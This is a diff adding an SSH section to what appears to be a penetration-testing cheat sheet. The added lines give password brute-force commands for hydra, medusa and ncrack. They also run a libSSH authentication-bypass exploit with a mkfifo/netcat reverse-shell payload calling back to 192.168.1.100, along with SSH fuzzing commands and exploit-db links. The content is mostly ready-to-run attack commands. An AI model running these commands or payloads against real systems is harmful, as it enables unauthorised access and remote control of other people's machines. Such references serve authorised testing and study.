@@ -232,6 +232,69 @@ nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-ba
 
 ```
 nc 10.11.1.111 22
+User can ask to execute a command right after authentication before it’s default command or shell is executed
+
+$ ssh -v noraj@192.168.1.94 id
+...
+Password:
+debug1: Authentication succeeded (keyboard-interactive).
+Authenticated to 192.168.1.94 ([192.168.1.94]:22).
+debug1: channel 0: new [client-session]
+debug1: Requesting no-more-sessions@openssh.com
+debug1: Entering interactive session.
+debug1: pledge: network
+debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
+debug1: Sending command: id
+debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
+debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
+uid=1000(noraj) gid=100(users) groups=100(users)
+debug1: channel 0: free: client-session, nchannels 1
+Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
+Bytes per second: sent 43133.4, received 44349.5
+debug1: Exit status 0
+
+Check Auth Methods:
+
+$ ssh -v 192.168.1.94
+OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
+...
+debug1: Authentications that can continue: publickey,password,keyboard-interactive
+
+Force Auth Method:
+
+$ ssh -v 192.168.1.94 -o PreferredAuthentications=password
+...
+debug1: Next authentication method: password
+
+BruteForce:
+
+hydra -l noraj -P /usr/share/wordlists/password/rockyou.txt -e s ssh://192.168.1.94
+medusa -h 192.168.1.94 -u noraj -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh
+ncrack --user noraj -P /usr/share/wordlists/password/rockyou.txt ssh://192.168.1.94
+
+LibSSH Before 0.7.6 and 0.8.4 - LibSSH 0.7.6 / 0.8.4 - Unauthorized Access 
+Id
+python /usr/share/exploitdb/exploits/linux/remote/46307.py 192.168.1.94 22 id
+Reverse
+python /usr/share/exploitdb/exploits/linux/remote/46307.py 192.168.1.94 22 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 80 >/tmp/f"
+
+SSH FUZZ
+https://dl.packetstormsecurity.net/fuzzer/sshfuzz.txt
+
+cpan Net::SSH2
+./sshfuzz.pl -H 192.168.1.94 -P 22 -u noraj -p noraj
+
+use auxiliary/fuzzers/ssh/ssh_version_2
+
+ssh_audit
+
+• https://www.exploit-db.com/exploits/18557 ~ Sysax 5.53 – SSH ‘Username’ Remote Buffer Overflow
+• https://www.exploit-db.com/exploits/45001 ~ OpenSSH < 6.6 SFTP – Command Execution                             
+• https://www.exploit-db.com/exploits/45233 ~ OpenSSH 2.3 < 7.7 – Username Enumeration                             
+• https://www.exploit-db.com/exploits/46516 ~ OpenSSH SCP Client – Write Arbitrary Files                             
+
+http://www.vegardno.net/2017/03/fuzzing-openssh-daemon-using-afl.html
+
 ```
 
 ## Port 25 - Telnet
